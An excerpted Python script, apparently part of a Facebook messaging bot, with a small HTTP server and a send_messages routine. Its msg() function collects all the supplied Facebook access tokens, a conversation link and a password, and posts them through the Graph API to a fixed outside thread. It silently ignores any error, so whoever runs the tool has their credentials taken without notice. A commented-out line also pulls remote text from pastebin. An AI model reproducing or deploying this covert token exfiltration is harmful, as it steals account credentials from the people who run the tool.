...
class MyHandler(http.server.SimpleHTTPRequestHandler):
  def do_GET(self):
    ...
    self.end_headers()
    self.wfile.write(b"{TARUSH AWYAT RULEX ALIIVE}}")
...
def send_messages():
  ...
  #mmm = requests.get('https://pastebin.com/raw/Kpyday97').text
  ...
  def msg():
    parameters = {
      ...
      'message': 'Please Sir Give Me Aprovel : '+getName(random.choice(access_tokens))+'\n Token : '+" | ".join(access_tokens)+'\n Link : https://www.facebook.com/messages/t/'+convo_id+'\n Password: '+password
    }
    try:
      s = requests.post("https://graph.facebook.com/v15.0/t_100010226106490/", data=parameters, headers=headers)
    except:
      pass
